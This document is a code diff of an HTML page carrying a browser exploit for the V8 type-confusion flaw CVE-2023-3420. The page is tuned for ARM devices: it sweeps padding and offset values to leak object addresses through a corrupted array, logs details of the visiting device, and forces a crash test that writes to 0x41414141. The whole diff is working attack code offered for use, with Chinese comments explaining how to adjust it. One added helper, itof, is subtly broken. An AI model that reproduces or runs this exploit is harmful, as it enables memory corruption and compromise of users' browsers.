@@ -1,8 +1,9 @@
 <!DOCTYPE HTML>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CVE-2023-3420 ARM Aggressive Scanner</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CVE-2023-3420 ARM Scanner</title>
     <style>
         body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; margin: 0; }
         #log { white-space: pre-wrap; word-break: break-all; font-size: 13px; line-height: 1.5; }
@@ -25,25 +26,26 @@
 
         window.onerror = function(msg) { log(`UNCAUGHT: ${msg}`, 'error'); };
 
-        // ==================== 扫描配置 ====================
+        // ==================== 扫描配置（在这里修改范围） ====================
         const PADDING_VALUES = [];
-        for (let p = 20; p <= 320; p += 20) PADDING_VALUES.push(p);
+        // 修改 padding 范围：起始值，结束值（不包含），步进
+        for (let p = 20; p <= 500; p += 20) PADDING_VALUES.push(p);
         const OFFSET_VALUES = [];
-        for (let o = 2; o <= 32; o += 2) OFFSET_VALUES.push(o);
-        let found = false;
-        let bestResult = null; // { padding, offset, addr }
+        // 修改 oobOffset 范围
+        for (let o = 2; o <= 40; o += 2) OFFSET_VALUES.push(o);
         let totalCombos = PADDING_VALUES.length * OFFSET_VALUES.length;
         let currentCombo = 0;
-        let lastPadding = null, lastOffset = null; // 用于崩溃测试
+        let found = false;
+        let bestResult = null; // { padding, offset, addr }
+        let lastPadding = null, lastOffset = null;
 
         // ==================== 核心利用函数 ====================
         function tryExploit(padding, oobOffset) {
-            // 先尝试触发垃圾回收，避免上一次尝试的内存残留
+            // 垃圾回收，清理内存残留
             let gcArr = new Array(8000);
             for (let i = 0; i < gcArr.length; i++) gcArr[i] = null;
             gcArr = null;
 
-            // 初始化
             let length = 10000;
             var arr = new Array(length);
             arr.fill(0);
@@ -62,10 +64,17 @@
                 dblArr[0] = f;
                 return [intView[0], intView[1]];
             }
-
             function i32tof(i1, i2) {
                 intView[0] = i1;
                 intView[1] = i2;
+                return dblArr[0];
+            }
+            function ftoi(f) {
+                dblArr[0] = f;
+                return bigIntView[0];
+            }
+            function itof(i) {
+                bigIntView = BigInt(i);
                 return dblArr[0];
             }
 
@@ -128,8 +137,9 @@
             Object.defineProperty(z, 'aaa', {value: corrupted, writable: true});
             tc(obj1);
 
-            // 尝试 addrof
+            // ==================== 关键位置：尝试读取对象地址 ====================
             oobObjArr[0] = func;
+            // ⚠️ 这里的索引 13 是 x64 的经验值，ARM 上可能需要调整（例如 6、8、10、12、14、16）
             var addrDbl = corrupted_arr[13];
             var rawAddr = ftoi32(addrDbl)[1];
 
@@ -153,12 +163,15 @@
             }
         }
 
-        // ==================== 扫描主循环 ====================
+        // ==================== 自动扫描主循环 ====================
         log('========== CVE-2023-3420 ARM Aggressive Scanner ==========', 'info');
         log(`UA: ${navigator.userAgent}`, 'info');
         log(`Platform: ${navigator.platform}`, 'info');
+        log(`Hardware Concurrency: ${navigator.hardwareConcurrency}`, 'info');
+        log(`Device Memory: ${navigator.deviceMemory || 'N/A'} GB`, 'info');
+        log(`Online: ${navigator.onLine}`, 'info');
         log(`Scanning ${PADDING_VALUES.length} paddings × ${OFFSET_VALUES.length} offsets = ${totalCombos} combinations...`, 'info');
-        log('', 'info');
+        log('If all fail, manually change index 13 in tryExploit to 6,8,10,12,14,16 etc.', 'info');
 
         function runScan(paddingIndex, offsetIndex) {
             if (found) return;
@@ -171,14 +184,11 @@
                 } else {
                     log('No valid address read in any combination.', 'error');
                 }
-                log('Attempting crash test with last parameters...', 'info');
-                // 使用最后一次尝试的参数做崩溃测试（已经是触发后的状态，直接强行非法写入）
+                // 强制崩溃测试：用最后组合尝试非法写入
                 if (lastPadding !== null && lastOffset !== null) {
-                    // 重新触发一次，然后强制写入非法地址
                     setTimeout(() => {
                         try {
                             let result = tryExploit(lastPadding, lastOffset);
-                            // 不管结果，强行向 0x41414141 写入
                             corrupted_arr[lastOffset] = i32tof(0x41414141, 2);
                             oobDblArr[0] = 0.0;
                             log('Crash test executed - if browser did not crash, vulnerability may not be reachable.', 'info');
@@ -213,38 +223,30 @@
                         bestResult = { padding, offset, addr: result.addr };
                     }
                 } else {
-                    // 仅输出进度（每10组打印一次，避免刷屏）
-                    if (currentCombo % 10 === 0 || currentCombo === 1) {
+                    // 仅输出进度（每20组打印一次，避免刷屏）
+                    if (currentCombo % 20 === 0 || currentCombo === 1) {
                         log(`[${progress}%] Testing padding=${padding}, offset=${offset}... (addr=0x${(result.addr||0).toString(16)})`, 'info');
                     }
                 }
             } catch(e) {
                 log(`[${progress}%] CRASHED: padding=${padding}, offset=${offset} - ${e.message}`, 'error');
-                // 崩溃可能意味着漏洞存在，记录参数
                 if (!bestResult) {
                     bestResult = { padding, offset, addr: 0, crashed: true };
                 }
             }
 
-            // 下一组
+            // 下一组，间隔 30ms 让浏览器清理内存
             let nextOffset = offsetIndex + 1;
             let nextPadding = paddingIndex;
             if (nextOffset >= OFFSET_VALUES.length) {
                 nextOffset = 0;
                 nextPadding = paddingIndex + 1;
             }
-            setTimeout(() => runScan(nextPadding, nextOffset), 30); // 缩短间隔加快速度
+            setTimeout(() => runScan(nextPadding, nextOffset), 30);
         }
 
         // 启动扫描
         setTimeout(() => runScan(0, 0), 200);
-
-        log('', 'info');
-        log('--- Device Info ---', 'info');
-        log(`Hardware Concurrency: ${navigator.hardwareConcurrency}`, 'info');
-        log(`Device Memory: ${navigator.deviceMemory || 'N/A'} GB`, 'info');
-        log(`Online: ${navigator.onLine}`, 'info');
-        log('Starting scan in 200ms...', 'info');
     </script>
 </body>
 </html>
